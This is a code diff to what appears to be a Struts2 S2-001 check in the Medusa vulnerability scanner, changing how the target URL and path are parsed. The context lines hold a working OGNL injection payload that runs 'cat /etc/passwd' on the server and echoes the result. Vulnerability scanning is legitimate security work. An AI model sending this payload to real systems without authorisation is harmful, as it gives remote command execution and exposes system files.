@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,randoms,ErrorHandling,Proxies
+from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies
 import urllib3
+import urllib.parse
 import requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class VulnerabilityInfo(object):
@@ -20,12 +21,19 @@ class VulnerabilityInfo(object):
         self.info['suggest'] = "尽快升级最新系统"  # 修复建议
         self.info['version'] = "Struts2.0.0-Struts2.0.8"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
+class UrlProcessing:  # URL处理函数
+    def result(self, url):
+        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
+            res = urllib.parse.urlparse(url)
+        else:
+            res = urllib.parse.urlparse('http://%s' % url)
+        return res.scheme, res.hostname, res.port,res.path
 
 
 
 def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
-    scheme, url, port = UrlProcessing().result(Url)
+    scheme, url, port,path = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
         port = 443
     elif port is None and scheme == 'http':
@@ -33,7 +41,7 @@ def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     else:
         port = port
     payload = '''username=medusa&password=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22cat%22%2c%22%2fetc%2fpasswd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d'''
-    payload_url = scheme+"://"+url+':'+str(port)+'/login.action'
+    payload_url = scheme+"://"+url+':'+str(port)+path
 
     headers = {
         'Accept-Encoding': 'gzip, deflate',
